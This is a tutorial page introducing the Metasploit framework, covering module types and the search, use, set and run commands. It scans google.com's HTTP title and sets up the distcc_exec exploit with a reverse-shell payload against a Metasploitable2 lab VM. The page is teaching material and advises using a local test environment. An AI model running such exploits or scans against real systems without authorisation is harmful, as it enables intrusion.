---
title: "Introduction to Metasploit"
description: "Learn more about the Metasploit framework."
icon: "code"
draft: false
---

Assuming you now have Metasploit installed, run the `msfconsole` command to open Metasploit:

<!-- ![msf](https://i.imgur.com/I2r5rxg.png) -->
<blockquote class="imgur-embed-pub" lang="en" data-id="I2r5rxg" data-context="false" ><a href="//imgur.com/I2r5rxg"></a></blockquote><script async src="//s.imgur.com/min/embed.js" charset="utf-8"></script>

## Finding Modules

Metasploit is based around the concept of modules. The most commonly used module types are:

- Auxiliary - Auxiliary modules do not exploit a target, but can perform data gathering or administrative tasks
- Exploit - Exploit modules leverage vulnerabilities in a manner that allows the framework to execute arbitrary code on the target host
- Payloads - Arbitrary code that can be executed on a remote target to perform a task, such as creating users, opening shells, etc
- Post - Post modules are used after a machine has been compromised. They perform useful tasks such as gathering, collecting, or enumerating data from a session.

You can use the search command to search for modules:

```sh
search type:auxiliary http html title tag
```
<!-- ![aux](https://i.imgur.com/zfS0jeL.png) -->
<blockquote class="imgur-embed-pub" lang="en" data-id="zfS0jeL" data-context="false" ><a href="//imgur.com/zfS0jeL"></a></blockquote><script async src="//s.imgur.com/min/embed.js" charset="utf-8"></script>

You can use a Metasploit module by specifying the full module name. The prompt will be updated to indicate the currently active module:

Example: 
```sh
use auxiliary/scanner/http/title
```

Each module offers configurable options which can be viewed with the show options, or aliased options, command:

```sh
show options
```
<!-- https://i.imgur.com/pyHXlf7.png -->
<blockquote class="imgur-embed-pub" lang="en" data-id="pyHXlf7" data-context="false" ><a href="//imgur.com/pyHXlf7"></a></blockquote><script async src="//s.imgur.com/min/embed.js" charset="utf-8"></script>

To set a module option, use the set command. We will set the RHOST option - which represents the target host(s) that the module will run against:

```sh
set RHOSTS google.com
```

The run command will run the module against the target, showing the target’s HTTP title:

<!-- https://i.imgur.com/xG4VbZ4.png -->
<blockquote class="imgur-embed-pub" lang="en" data-id="xG4VbZ4" data-context="false" ><a href="//imgur.com/xG4VbZ4"></a></blockquote><script async src="//s.imgur.com/min/embed.js" charset="utf-8"></script>

We can also run modules with options set as part of the run command. For instance, setting both RHOSTS and enabling HttpTrace functionality:

```sh
run rhosts=google.com httptrace=true
```
<!-- https://i.imgur.com/jAchW4Z.png -->
<blockquote class="imgur-embed-pub" lang="en" data-id="jAchW4Z" data-context="false" ><a href="//imgur.com/jAchW4Z"></a></blockquote><script async src="//s.imgur.com/min/embed.js" charset="utf-8"></script>

There is quite a lot of information on the output and you can scroll more to see it.

## Running exploit modules
Exploit modules require a vulnerable target. It is recommended to set up your own local test environment to run modules against. For instance in a Virtual Machine, or with Docker. There are multiple pre-built vulnerable test environments including:

Metasploitable2
Metasploitable3
For instance - targeting a vulnerable Metasploitable2 VM and using the unix/misc/distcc_exec module:
```sh
use unix/misc/distcc_exec
```

Exploit modules will generally at a minimum require the following options to be set:

- RHOST - The remote target host address
- LHOST - The listen address. Important This may need to be set to your tun0 IP address or similar, if you are connecting to your target over a VPN
- PAYLOAD - The code to be executed after an exploit is successful. For instance creating a user, or a Metasploit session. Often this can be left as the default value, but may sometimes require configuration

Each module offers configurable options which can be viewed with the show options, or aliased options, command:

<!-- https://i.imgur.com/5YTf1lE.png -->
<blockquote class="imgur-embed-pub" lang="en" data-id="5YTf1lE" data-context="false" ><a href="//imgur.com/5YTf1lE"></a></blockquote><script async src="//s.imgur.com/min/embed.js" charset="utf-8"></script>

For this scenario you can manually set each of the required option values (RHOST, LHOST, and optionally PAYLOAD):

```sh
set rhost => 192.168.123.133
set lhost 192.168.123.1
set payload cmd/unix/reverse
```

The run command will run the module against the target, there is also an aliased exploit command which will perform the same action:

```sh
run 
```


You have now learnt how to find and run modules in Metasploit, as well as how to make some custom configurations.